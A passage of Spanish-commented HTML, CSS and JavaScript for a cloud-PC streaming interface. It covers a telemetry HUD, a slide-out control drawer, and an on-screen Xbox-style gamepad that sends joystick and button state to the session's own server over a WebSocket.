    position: fixed; border-radius: 50%; pointer-events: none; z-index: 999997;
    transform: translate(-50%, -50%) scale(0); animation: ripple-pop 0.35s ease-out forwards;
}
.cloud-touch-ripple.left-click { border: 2px solid rgba(0, 255, 200, 0.85); background: rgba(0, 255, 200, 0.2); }
.cloud-touch-ripple.right-click { border: 2px solid rgba(255, 42, 133, 0.85); background: rgba(255, 42, 133, 0.25); }
@keyframes ripple-pop {
    0% { transform: translate(-50%, -50%) scale(0.2); opacity: 1; width: 20px; height: 20px; }
    100% { transform: translate(-50%, -50%) scale(2.2); opacity: 0; width: 44px; height: 44px; }
}

#cloud-toast {
    position: fixed; top: calc(16px + var(--safe-top)); left: 50%;
    transform: translateX(-50%) translateY(-20px);
    background: rgba(15, 23, 42, 0.90);
    backdrop-filter: blur(14px);
    -webkit-backdrop-filter: blur(14px);
    border: 1px solid rgba(0, 255, 200, 0.35);
    color: #f8fafc; padding: 6px 16px; border-radius: 20px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    font-size: 12px; font-weight: 600; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000000; pointer-events: none; opacity: 0;
    transition: opacity 0.2s ease, transform 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}
#cloud-toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
</style>

<!-- 1. STREAM TELEMETRY HUD (ESTÁNDAR GAMING GEFORCE NOW & STEAM DECK) -->
<div id="cloud-perf-badge" title="Tocar para abrir diagnóstico avanzado de stream">
    <div class="perf-dot" id="perf-status-dot"></div>
    <div class="hud-metric">
        <span class="hud-val fps-val" id="perf-fps-text">60</span>
        <span class="hud-unit">FPS</span>
    </div>
    <div class="hud-sep"></div>
    <div class="hud-metric">
        <span class="hud-val ping-val" id="perf-ping-text">--</span>
        <span class="hud-unit">MS</span>
    </div>
    <div class="hud-signal lvl-4" id="perf-signal-bars" title="Calidad de enlace">
        <span class="bar b1"></span>
        <span class="bar b2"></span>
        <span class="bar b3"></span>
        <span class="bar b4"></span>
    </div>
    <span class="hud-tag" id="perf-res-tag">1080p</span>
</div>

<!-- PANEL DIAGNÓSTICO TELEMÉTRICO EXPANDIBLE (GEFORCE NOW CTRL+N) -->
<div id="cloud-telemetry-panel">
    <div class="telem-header">
        <span class="telem-title">Telemetría de Transmisión</span>
        <span class="telem-close" id="btn-close-telem" title="Cerrar diagnóstico">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </span>
    </div>
    <div class="telem-grid">
        <div class="telem-row">
            <span class="telem-key">Resolución Activa</span>
            <span class="telem-val cyan" id="telem-res-val">1920 × 1080 (16:9)</span>
        </div>
        <div class="telem-row">
            <span class="telem-key">Refresco de Pantalla</span>
            <span class="telem-val" id="telem-refresh-val">60 Hz Nativo</span>
        </div>
        <div class="telem-row">
            <span class="telem-key">Frame Pacing (Tiempo)</span>
            <span class="telem-val cyan" id="telem-pacing-val">16.6 ms</span>
        </div>
        <div class="telem-row">
            <span class="telem-key">Latencia de Red (RTT)</span>
            <span class="telem-val blue" id="telem-rtt-val">-- ms</span>
        </div>
        <div class="telem-row">
            <span class="telem-key">Calidad de Enlace</span>
            <span class="telem-val cyan" id="telem-quality-val">Óptima (100%)</span>
        </div>
        <div class="telem-row">
            <span class="telem-key">Motor de Streaming</span>
            <span class="telem-val">Nginx • Websockify</span>
        </div>
        <div class="telem-row">
            <span class="telem-key">Canal de Audio</span>
            <span class="telem-val" id="telem-audio-val">PulseAudio 48kHz</span>
        </div>
        <div class="telem-row">
            <span class="telem-key">Kernel Gamepad</span>
            <span class="telem-val">Virtual X-Box (/dev/uinput)</span>
        </div>
    </div>
</div>

<!-- 2. PESTAÑA LATERAL TRANSPARENTE AETHER (MARGEN IZQUIERDO) -->
<div id="aether-edge-tab" title="Deslizar o tocar para abrir controles">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
</div>
<div id="aether-scrim"></div>

<!-- 3. CAJÓN LATERAL DE HERRAMIENTAS (AETHER SIDE DRAWER - MARGEN IZQUIERDO) -->
<div id="aether-drawer">
    <div class="drawer-header">
        <div class="drawer-title">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--aether-cyan)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
            <span>Panel de Control Aether</span>
        </div>
        <button class="drawer-close" id="btn-drawer-close" title="Cerrar panel">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
        </button>
    </div>
    <div class="drawer-items">
        <button class="drawer-btn" id="btn-aether-gamepad">
            <div class="drawer-btn-left">
                <span class="d-icon" id="icon-aether-gamepad">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="6"/><line x1="6" y1="12" x2="10" y2="12"/><line x1="8" y1="10" x2="8" y2="14"/><line x1="15" y1="13" x2="15.01" y2="13"/><line x1="18" y1="11" x2="18.01" y2="11"/></svg>
                </span>
                <span>Mandos en Pantalla</span>
            </div>
            <span class="drawer-pill" id="badge-aether-gamepad">OFF</span>
        </button>
        <button class="drawer-btn active-glow" id="btn-aether-mode">
            <div class="drawer-btn-left">
                <span class="d-icon" id="icon-aether-mode">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="7"/><line x1="12" y1="6" x2="12" y2="10"/></svg>
                </span>
                <span>Modo de Entrada</span>
            </div>
            <span class="drawer-pill active" id="badge-aether-mode">Trackpad</span>
        </button>
        <button class="drawer-btn" id="btn-aether-keyboard">
            <div class="drawer-btn-left">
                <span class="d-icon" id="icon-aether-keyboard">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="6" y1="8" x2="6.01" y2="8"/><line x1="10" y1="8" x2="10.01" y2="8"/><line x1="14" y1="8" x2="14.01" y2="8"/><line x1="18" y1="8" x2="18.01" y2="8"/><line x1="6" y1="12" x2="6.01" y2="12"/><line x1="10" y1="12" x2="10.01" y2="12"/><line x1="14" y1="12" x2="14.01" y2="12"/><line x1="18" y1="12" x2="18.01" y2="12"/><line x1="7" y1="16" x2="17" y2="16"/></svg>
                </span>
                <span>Teclado en Pantalla</span>
            </div>
            <span class="drawer-pill">Activar</span>
        </button>
        <button class="drawer-btn" id="btn-aether-aspect">
            <div class="drawer-btn-left">
                <span class="d-icon" id="icon-aether-aspect">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                </span>
                <span>Ajuste de Pantalla</span>
            </div>
            <span class="drawer-pill" id="badge-aether-aspect">16:9</span>
        </button>
        <button class="drawer-btn" id="btn-aether-zoom">
            <div class="drawer-btn-left">
                <span class="d-icon" id="icon-aether-zoom">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/><line x1="8" y1="11" x2="14" y2="11"/></svg>
                </span>
                <span>Restablecer Zoom</span>
            </div>
            <span class="drawer-pill" id="badge-aether-zoom">100%</span>
        </button>
        <button class="drawer-btn" id="btn-aether-audio">
            <div class="drawer-btn-left">
                <span class="d-icon" id="icon-aether-audio">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
                </span>
                <span>Canal de Audio</span>
            </div>
            <span class="drawer-pill active" id="badge-aether-audio">ON</span>
        </button>
        <button class="drawer-btn" id="btn-aether-fullscreen">
            <div class="drawer-btn-left">
                <span class="d-icon" id="icon-aether-fullscreen">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg>
                </span>
                <span>Pantalla Completa</span>
            </div>
            <span class="drawer-pill" id="badge-aether-fullscreen">Ventana</span>
        </button>
    </div>
    <div class="drawer-footer">
        <button class="drawer-exit-btn" id="btn-aether-exit">
            <span style="display:inline-flex; align-items:center; gap:8px; justify-content:center;">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
                <span>Desconectar Sesión</span>
            </span>
        </button>
    </div>
</div>

<!-- 4. CAPA DE MANDOS VIRTUALES TÁCTILES (XBOX CLASSIC + NEON FUSION) -->
<div id="virtual-gamepad-overlay">
    <!-- Joystick Izquierdo -->
    <div class="gp-stick-zone" id="left-stick-zone">
        <div class="gp-stick-base">
            <div class="gp-stick-thumb" id="left-stick-thumb"></div>
        </div>
    </div>

    <!-- Joystick Derecho (Cámara 3D y Apuntar) -->
    <div class="gp-stick-zone gp-right-stick-zone" id="right-stick-zone">
        <div class="gp-stick-base">
            <div class="gp-stick-thumb" id="right-stick-thumb"></div>
        </div>
    </div>

    <!-- Cruceta D-Pad -->
    <div class="gp-dpad-container">
        <button class="gp-dpad-btn gp-dpad-up" data-btn="12">▲</button>
        <button class="gp-dpad-btn gp-dpad-down" data-btn="13">▼</button>
        <button class="gp-dpad-btn gp-dpad-left" data-btn="14">◀</button>
        <button class="gp-dpad-btn gp-dpad-right" data-btn="15">▶</button>
    </div>

    <!-- Botones ABXY (Fusión Xbox Classic) -->
    <div class="gp-abxy-container">
        <button class="gp-action-btn btn-xbox-y" data-btn="3">Y</button>
        <button class="gp-action-btn btn-xbox-x" data-btn="2">X</button>
        <button class="gp-action-btn btn-xbox-b" data-btn="1">B</button>
        <button class="gp-action-btn btn-xbox-a" data-btn="0">A</button>
    </div>

    <!-- Gatillos y Bumpers (LB, LT, RT, RB) -->
    <div class="gp-shoulders-container">
        <div class="gp-shoulder-group">
            <button class="gp-shoulder-btn" data-btn="4">LB</button>
            <button class="gp-shoulder-btn" data-btn="6">LT</button>
        </div>
        <div class="gp-shoulder-group">
            <button class="gp-shoulder-btn" data-btn="7">RT</button>
            <button class="gp-shoulder-btn" data-btn="5">RB</button>
        </div>
    </div>

    <!-- Botones Select y Start -->
    <div class="gp-center-container">
        <button class="gp-center-btn" data-btn="8">BACK</button>
        <button class="gp-center-btn" data-btn="9">START</button>
    </div>
</div>

<!-- 5. CURSOR Y ANILLO VISUAL -->
<svg id="cloud-virtual-cursor" viewBox="0 0 24 24" fill="#ffffff" stroke="#000000" stroke-width="1.6">
    <path d="M4 4l7 17 2.5-6.5L20 12 4 4z"/>
</svg>
<svg id="cloud-hold-ring" viewBox="0 0 44 44">
    <circle cx="22" cy="22" r="19" fill="none" stroke="rgba(255,255,255,0.25)" stroke-width="3"/>
    <circle class="progress" cx="22" cy="22" r="19" fill="none" stroke="#00ffc8" stroke-width="3" stroke-linecap="round" transform="rotate(-90 22 22)"/>
</svg>
<div id="cloud-toast">Modo Trackpad Activo</div>

<script>
(function() {
    "use strict";

    // -------------------------------------------------------------------------
    // 1. ELEMENTOS DEL DOM
    // -------------------------------------------------------------------------
    const edgeTab = document.getElementById("aether-edge-tab");
    const scrim = document.getElementById("aether-scrim");
    const drawer = document.getElementById("aether-drawer");
    const closeDrawerBtn = document.getElementById("btn-drawer-close");

    const btnGamepad = document.getElementById("btn-aether-gamepad");
    const badgeGamepad = document.getElementById("badge-aether-gamepad");
    const btnMode = document.getElementById("btn-aether-mode");
    const iconMode = document.getElementById("icon-aether-mode");
    const badgeMode = document.getElementById("badge-aether-mode");
    const btnKeyboard = document.getElementById("btn-aether-keyboard");
    const btnAspect = document.getElementById("btn-aether-aspect");
    const badgeAspect = document.getElementById("badge-aether-aspect");
    const btnZoom = document.getElementById("btn-aether-zoom");
    const badgeZoom = document.getElementById("badge-aether-zoom");
    const btnAudio = document.getElementById("btn-aether-audio");
    const iconAudio = document.getElementById("icon-aether-audio");
    const badgeAudio = document.getElementById("badge-aether-audio");
    const btnFullscreen = document.getElementById("btn-aether-fullscreen");
    const badgeFullscreen = document.getElementById("badge-aether-fullscreen");
    const btnExit = document.getElementById("btn-aether-exit");

    const gpOverlay = document.getElementById("virtual-gamepad-overlay");
    const leftStickZone = document.getElementById("left-stick-zone");
    const leftStickThumb = document.getElementById("left-stick-thumb");
    const rightStickZone = document.getElementById("right-stick-zone");
    const rightStickThumb = document.getElementById("right-stick-thumb");

    // Telemetría Gaming GeForce NOW & Steam Deck
    const perfBadge = document.getElementById("cloud-perf-badge");
    const perfFps = document.getElementById("perf-fps-text");
    const perfPing = document.getElementById("perf-ping-text");
    const perfDot = document.getElementById("perf-status-dot");
    const perfSignalBars = document.getElementById("perf-signal-bars");
    const telemPanel = document.getElementById("cloud-telemetry-panel");
    const btnCloseTelem = document.getElementById("btn-close-telem");
    const telemResVal = document.getElementById("telem-res-val");
    const telemRttVal = document.getElementById("telem-rtt-val");
    const telemPacingVal = document.getElementById("telem-pacing-val");
    const telemQualityVal = document.getElementById("telem-quality-val");

    const cursor = document.getElementById("cloud-virtual-cursor");
    const holdRing = document.getElementById("cloud-hold-ring");
    const toast = document.getElementById("cloud-toast");

    const screenW = 1920, screenH = 1080;
    let virtX = 960, virtY = 540;
    let currentMode = localStorage.getItem("cloudpc_input_mode") || "TRACKPAD";
    let isGamepadVisible = localStorage.getItem("cloudpc_gp_visible") === "true";
    let isStretchedAspect = false;
    let isAudioMuted = false;

    let currentZoom = 1.0, panX = 0, panY = 0;
    let isDragging = false, isTouching = false, touchStartTime = 0, lastTapEndTime = 0;
    let initialTouchCount = 0, startX = 0, startY = 0, lastX = 0, lastY = 0, totalMoved = 0;
    let dragHoldTimer = null, isTapAndHalfCandidate = false;

    let scrollVelocityY = 0, lastScrollY = 0, lastScrollX = 0, lastScrollTime = 0, momentumAnimFrame = null;
    let isPinching = false, initialPinchDist = 0, initialPinchZoom = 1.0, initialPinchMidX = 0, initialPinchMidY = 0;
    let initialPinchWorldX = 0, initialPinchWorldY = 0, lastTapStartX = 0, lastTapStartY = 0;
    let lastMoveTime = 0;

    function clampPanX(x, zoom) {
        if (zoom <= 1.01) return 0;
        const minX = window.innerWidth * (1 - zoom);
        return Math.min(0, Math.max(minX, x));
    }
    function clampPanY(y, zoom) {
        if (zoom <= 1.01) return 0;
        const minY = window.innerHeight * (1 - zoom);
        return Math.min(0, Math.max(minY, y));
    }
    function zoomToPoint(targetZoom, screenX, screenY, animate) {
        const clampedZoom = Math.min(3.8, Math.max(1.0, targetZoom));
        if (clampedZoom <= 1.02) {
            currentZoom = 1.0;
            panX = 0;
            panY = 0;
        } else {
            const worldX = (screenX - panX) / currentZoom;
            const worldY = (screenY - panY) / currentZoom;
            currentZoom = clampedZoom;
            panX = clampPanX(screenX - (worldX * currentZoom), currentZoom);
            panY = clampPanY(screenY - (worldY * currentZoom), currentZoom);
        }
        updateCanvasTransform(animate);
    }

    function getRFB() { return (window.UI && window.UI.rfb) ? window.UI.rfb : null; }

    function showToast(msg) {
        if (!toast) return;
        toast.innerText = msg;
        toast.classList.add("show");
        clearTimeout(toast._timer);
        toast._timer = setTimeout(() => toast.classList.remove("show"), 1800);
    }

    function hapticFeedback(pattern) {
        if (navigator.vibrate) { try { navigator.vibrate(pattern); } catch(e) {} }
    }

    function createRipple(clientX, clientY, type) {
        const r = document.createElement("div");
        r.className = `cloud-touch-ripple ${type}`;
        r.style.left = clientX + "px";
        r.style.top = clientY + "px";
        document.body.appendChild(r);
        setTimeout(() => r.remove(), 380);
    }

    // -------------------------------------------------------------------------
    // 2. CONTROL DEL CAJÓN AETHER Y AUTO-FADE
    // -------------------------------------------------------------------------
    let edgeIdleTimer = null;
    function resetEdgeIdleTimer() {
        if (!edgeTab) return;
        edgeTab.style.opacity = "1";
        clearTimeout(edgeIdleTimer);
        edgeIdleTimer = setTimeout(() => {
            if (!drawer.classList.contains("open")) {
                edgeTab.style.opacity = "0.25";
            }
        }, 3200);
    }

    function openDrawer() {
        drawer.classList.add("open");
        scrim.classList.add("open");
        edgeTab.classList.add("active");
        hapticFeedback(20);
    }

    function closeDrawer() {
        drawer.classList.remove("open");
        scrim.classList.remove("open");
        edgeTab.classList.remove("active");
        resetEdgeIdleTimer();
    }

    // Helper para garantizar respuesta táctil instantánea y sin rebotes en botones del menú
    function attachButtonTap(elem, callback) {
        if (!elem) return;
        let lastTap = 0;
        const handle = function(e) {
            e.stopPropagation();
            const now = performance.now();
            if (now - lastTap < 220) return;
            lastTap = now;
            callback(e);
        };
        elem.addEventListener("click", handle);
        elem.addEventListener("touchend", function(e) {
            e.preventDefault();
            handle(e);
        }, { passive: false });
    }

    // Permitir clics y desplazamiento suave dentro del drawer sin sangrado al canvas
    if (drawer) {
        drawer.addEventListener("click", function(e) { e.stopPropagation(); });
    }
    if (scrim) {
        scrim.addEventListener("click", function(e) { e.stopPropagation(); closeDrawer(); });
        scrim.addEventListener("touchend", function(e) {
            e.stopPropagation();
            e.preventDefault();
            closeDrawer();
        }, { passive: false });
    }

    if (edgeTab) {
        resetEdgeIdleTimer();
        let isTabDragging = false, tabStartY = 0, tabInitTop = 0, tabDragged = false;
        let tabTapTimer = 0;

        edgeTab.addEventListener("pointerdown", function(e) {
            e.stopPropagation();
            isTabDragging = true;
            tabDragged = false;
            tabStartY = e.clientY;
            tabInitTop = edgeTab.getBoundingClientRect().top;
            resetEdgeIdleTimer();
        });

        window.addEventListener("pointermove", function(e) {
            if (!isTabDragging) return;
            const dy = e.clientY - tabStartY;
            if (Math.abs(dy) > 18) {
                tabDragged = true;
                const newTop = Math.max(10, Math.min(window.innerHeight - 70, tabInitTop + dy));
                edgeTab.style.top = newTop + "px";
            }
        });

        window.addEventListener("pointerup", function(e) {
            if (!isTabDragging) return;
            isTabDragging = false;
        });

        // Activación inmediata y garantizada al tocar la pestaña
        function toggleEdgeTab(e) {
            e.stopPropagation();
            if (tabDragged) {
                tabDragged = false;
                return;
            }
            const now = performance.now();
            if (now - tabTapTimer < 250) return;
            tabTapTimer = now;
            if (drawer.classList.contains("open")) {
                closeDrawer();
            } else {
                openDrawer();
            }
        }
        edgeTab.addEventListener("click", toggleEdgeTab);
        edgeTab.addEventListener("touchend", function(e) {
            if (!tabDragged) {
                e.preventDefault();
                toggleEdgeTab(e);
            }
        }, { passive: false });
    }

    if (closeDrawerBtn) attachButtonTap(closeDrawerBtn, function() { closeDrawer(); });

    // -------------------------------------------------------------------------
    // 3. CAPA DE MANDOS EN PANTALLA (XBOX FUSION) Y WEBSOCKET A /dev/uinput
    // -------------------------------------------------------------------------
    let gpSocket = null;
    let gpReconnectTimer = null;
    let gpPingInterval = null;
    let physicalGamepadCount = 0;
    let physicalPollingFrame = null;
    const gpButtonsState = new Array(17).fill(0);
    let gpAxesState = [0, 0, 0, 0];

    function initGamepadWebSocket() {
        if (gpSocket && (gpSocket.readyState === WebSocket.OPEN || gpSocket.readyState === WebSocket.CONNECTING)) return;
        const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
        const host = window.location.host;
        // Enrutamiento unificado vía Nginx en puerto 6080 (/gamepad) con fallback a 6081
        const wsPath = (window.location.port === "6081") ? (proto + "//" + window.location.hostname + ":6081") : (proto + "//" + host + "/gamepad");
        try {
            gpSocket = new WebSocket(wsPath);
            gpSocket.onopen = function() {
                console.log("[GAMEPAD] Bridge conectado con éxito:", wsPath);
                showToast("Mando Conectado al Kernel");
                clearTimeout(gpReconnectTimer);
                clearInterval(gpPingInterval);
                // Heartbeat cada 25s para mantener el túnel Cloudflare permanentemente abierto
                gpPingInterval = setInterval(() => {
                    if (gpSocket && gpSocket.readyState === WebSocket.OPEN) {
                        gpSocket.send(JSON.stringify({ type: "ping" }));
                    }
                }, 25000);
            };
            gpSocket.onclose = function() {
                clearInterval(gpPingInterval);
                if (isGamepadVisible || physicalGamepadCount > 0) {
                    clearTimeout(gpReconnectTimer);
                    gpReconnectTimer = setTimeout(initGamepadWebSocket, 2500);
                }
            };
            gpSocket.onerror = function() {
                clearInterval(gpPingInterval);
                if (!wsPath.includes(":6081")) {
                    try {
                        const fallbackUrl = proto + "//" + window.location.hostname + ":6081";
                        gpSocket = new WebSocket(fallbackUrl);
                    } catch(e) {}
                }
            };
        } catch(e) {}
    }

    function emitGamepadState() {
        if (gpSocket && gpSocket.readyState === WebSocket.OPEN) {
            gpSocket.send(JSON.stringify({ axes: gpAxesState, buttons: gpButtonsState }));
        }
    }

    // Detección Plug & Play de mandos físicos (Xbox, PlayStation, Switch, 8BitDo)
    window.addEventListener("gamepadconnected", function(e) {
        physicalGamepadCount++;
        console.log("[GAMEPAD] Mando físico conectado:", e.gamepad.id);
        const name = e.gamepad.id.length > 20 ? e.gamepad.id.substring(0, 20) + "..." : e.gamepad.id;
        showToast("Mando Conectado: " + name);
        hapticFeedback([20, 50, 20]);
        initGamepadWebSocket();
        startPhysicalGamepadLoop();
    });

    window.addEventListener("gamepaddisconnected", function(e) {
        physicalGamepadCount = Math.max(0, physicalGamepadCount - 1);
        showToast("Mando físico desconectado");
    });

    function startPhysicalGamepadLoop() {
        if (physicalPollingFrame) return;
        function poll() {
            const gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
            let active = false;
            for (let i = 0; i < gamepads.length; i++) {
                const gp = gamepads[i];
                if (gp && gp.connected) {
                    active = true;
                    // 1. Mapeo estándar de botones (0 a 16)
                    for (let b = 0; b < gp.buttons.length && b < 17; b++) {
                        const isPress = gp.buttons[b].pressed ? 1 : 0;
                        if (isPress) gpButtonsState[b] = 1;
                    }
                    // 2. Sticks analógicos físicos con Deadzone continua
                    if (gp.axes.length >= 2) {
                        const ax0 = gp.axes[0], ax1 = gp.axes[1];
                        if (Math.hypot(ax0, ax1) > 0.12) {
                            gpAxesState[0] = ax0;
                            gpAxesState[1] = ax1;
                        }
                    }
                    if (gp.axes.length >= 4) {
                        const ax2 = gp.axes[2], ax3 = gp.axes[3];
                        if (Math.hypot(ax2, ax3) > 0.12) {
                            gpAxesState[2] = ax2;
                            gpAxesState[3] = ax3;
                        }
                    }
                    emitGamepadState();
                    break;
                }
            }
            if (active || physicalGamepadCount > 0) {
                physicalPollingFrame = requestAnimationFrame(poll);
            } else {
                physicalPollingFrame = null;
            }
        }
        physicalPollingFrame = requestAnimationFrame(poll);
    }

    function setGamepadVisibility(visible) {
        isGamepadVisible = visible;
        localStorage.setItem("cloudpc_gp_visible", visible ? "true" : "false");
        if (visible) {
            gpOverlay.classList.add("visible");
            if (badgeGamepad) { badgeGamepad.innerText = "ON"; badgeGamepad.classList.add("active"); }
            btnGamepad.classList.add("active-glow");
            document.body.classList.add("tp-gamepad-active");
            initGamepadWebSocket();
            showToast("Mandos Táctiles Activados");
        } else {
            gpOverlay.classList.remove("visible");
            if (badgeGamepad) { badgeGamepad.innerText = "OFF"; badgeGamepad.classList.remove("active"); }
            btnGamepad.classList.remove("active-glow");
            document.body.classList.remove("tp-gamepad-active");
            showToast("Mandos Táctiles Ocultados");
        }
        hapticFeedback(25);
    }

    if (btnGamepad) {
        attachButtonTap(btnGamepad, function() {
            setGamepadVisibility(!isGamepadVisible);
        });
    }

    // A. Control del Joystick Analógico Izquierdo (Movimiento)
    let stickTouchId = null, stickCenterX = 0, stickCenterY = 0;
    const maxStickRadius = 42;

    if (leftStickZone) {
        leftStickZone.addEventListener("touchstart", function(e) {
            for (let i = 0; i < e.changedTouches.length; i++) {
                const t = e.changedTouches[i];
                if (stickTouchId === null) {
                    stickTouchId = t.identifier;
                    leftStickThumb.style.transition = "none";
                    const rect = leftStickZone.getBoundingClientRect();
                    stickCenterX = rect.left + rect.width / 2;
                    stickCenterY = rect.top + rect.height / 2;
                    handleStickMove(t.clientX, t.clientY);
                    break;
                }
            }
        }, { passive: false });

        window.addEventListener("touchmove", function(e) {
            if (stickTouchId === null) return;
            for (let i = 0; i < e.changedTouches.length; i++) {
                const t = e.changedTouches[i];
                if (t.identifier === stickTouchId) {
                    e.preventDefault();
                    handleStickMove(t.clientX, t.clientY);
                    break;
                }
            }
        }, { passive: false });

        const endStick = function(e) {
            if (stickTouchId === null) return;
            for (let i = 0; i < e.changedTouches.length; i++) {
                if (e.changedTouches[i].identifier === stickTouchId) {
                    stickTouchId = null;
                    leftStickThumb.style.transition = "transform 0.14s cubic-bezier(0.175, 0.885, 0.32, 1.275)";
                    leftStickThumb.style.transform = "translate3d(0, 0, 0)";
                    setTimeout(() => { leftStickThumb.style.transition = "none"; }, 150);
                    gpAxesState[0] = 0;
                    gpAxesState[1] = 0;
                    emitGamepadState();
                    break;
                }
            }
        };
        window.addEventListener("touchend", endStick);
        window.addEventListener("touchcancel", endStick);
    }

    function handleStickMove(clientX, clientY) {
        const dx = clientX - stickCenterX;
        const dy = clientY - stickCenterY;
        const dist = Math.hypot(dx, dy);
        const angle = Math.atan2(dy, dx);
        const clampedDist = Math.min(dist, maxStickRadius);

        const thumbX = Math.cos(angle) * clampedDist;
        const thumbY = Math.sin(angle) * clampedDist;
        leftStickThumb.style.transform = `translate3d(${thumbX}px, ${thumbY}px, 0)`;

        let normX = thumbX / maxStickRadius;
        let normY = thumbY / maxStickRadius;
        const mag = Math.hypot(normX, normY);
        const deadzone = 0.12;
        if (mag < deadzone) {
            normX = 0; normY = 0;
        } else {
            const scaledMag = (mag - deadzone) / (1.0 - deadzone);
            normX = (normX / mag) * scaledMag;
            normY = (normY / mag) * scaledMag;
        }
        gpAxesState[0] = normX;
        gpAxesState[1] = normY;
        emitGamepadState();
    }

    // B. Control del Joystick Analógico Derecho (Cámara 3D y Apuntar)
    let rightStickTouchId = null, rightStickCenterX = 0, rightStickCenterY = 0;

    if (rightStickZone) {
        rightStickZone.addEventListener("touchstart", function(e) {
            for (let i = 0; i < e.changedTouches.length; i++) {
                const t = e.changedTouches[i];
                if (rightStickTouchId === null) {
                    rightStickTouchId = t.identifier;
                    if (rightStickThumb) rightStickThumb.style.transition = "none";
                    const rect = rightStickZone.getBoundingClientRect();
                    rightStickCenterX = rect.left + rect.width / 2;
                    rightStickCenterY = rect.top + rect.height / 2;
                    handleRightStickMove(t.clientX, t.clientY);
                    break;
                }
            }
        }, { passive: false });

        window.addEventListener("touchmove", function(e) {
            if (rightStickTouchId === null) return;
            for (let i = 0; i < e.changedTouches.length; i++) {
                const t = e.changedTouches[i];
                if (t.identifier === rightStickTouchId) {
                    e.preventDefault();
                    handleRightStickMove(t.clientX, t.clientY);
                    break;
                }
            }
        }, { passive: false });

        const endRightStick = function(e) {
            if (rightStickTouchId === null) return;
            for (let i = 0; i < e.changedTouches.length; i++) {
                if (e.changedTouches[i].identifier === rightStickTouchId) {
                    rightStickTouchId = null;
                    if (rightStickThumb) {
                        rightStickThumb.style.transition = "transform 0.14s cubic-bezier(0.175, 0.885, 0.32, 1.275)";
                        rightStickThumb.style.transform = "translate3d(0, 0, 0)";
                        setTimeout(() => { if (rightStickThumb) rightStickThumb.style.transition = "none"; }, 150);
                    }
                    gpAxesState[2] = 0;
                    gpAxesState[3] = 0;
                    emitGamepadState();
                    break;
                }
            }
        };
        window.addEventListener("touchend", endRightStick);
        window.addEventListener("touchcancel", endRightStick);
    }

    function handleRightStickMove(clientX, clientY) {
        const dx = clientX - rightStickCenterX;
        const dy = clientY - rightStickCenterY;
        const dist = Math.hypot(dx, dy);
        const angle = Math.atan2(dy, dx);
        const clampedDist = Math.min(dist, maxStickRadius);

        const thumbX = Math.cos(angle) * clampedDist;
        const thumbY = Math.sin(angle) * clampedDist;
        if (rightStickThumb) rightStickThumb.style.transform = `translate3d(${thumbX}px, ${thumbY}px, 0)`;

        let normX = thumbX / maxStickRadius;
        let normY = thumbY / maxStickRadius;
        const mag = Math.hypot(normX, normY);
        const deadzone = 0.12;
        if (mag < deadzone) {
            normX = 0; normY = 0;
        } else {
            const scaledMag = (mag - deadzone) / (1.0 - deadzone);
            normX = (normX / mag) * scaledMag;
            normY = (normY / mag) * scaledMag;
        }
        gpAxesState[2] = normX;
        gpAxesState[3] = normY;
        emitGamepadState();
    }

    // B. Mapeo de Botones Táctiles en Pantalla (ABXY, DPad, Shoulders, Start, Select)
    document.querySelectorAll("[data-btn]").forEach(btn => {
        const btnIndex = parseInt(btn.getAttribute("data-btn"), 10);
        btn.addEventListener("touchstart", function(e) {
            e.preventDefault();
            e.stopPropagation();
            btn.classList.add("pressed");
            gpButtonsState[btnIndex] = 1;
            hapticFeedback(15);
            emitGamepadState();
        }, { passive: false });

